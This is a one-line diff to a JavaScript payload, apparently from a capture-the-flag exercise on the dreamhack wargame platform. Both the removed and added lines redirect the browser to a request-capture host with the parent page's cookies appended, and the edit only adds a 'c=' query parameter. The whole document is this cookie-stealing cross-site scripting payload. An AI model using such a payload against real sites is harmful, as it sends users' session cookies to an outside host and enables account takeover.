@@ -1,1 +1,1 @@
-location.href = "https://zqparrw.request.dreamhack.games?" + encodeURIComponent(parent.document.cookie);
+location.href = "https://zqparrw.request.dreamhack.games?c=" + encodeURIComponent(parent.document.cookie);
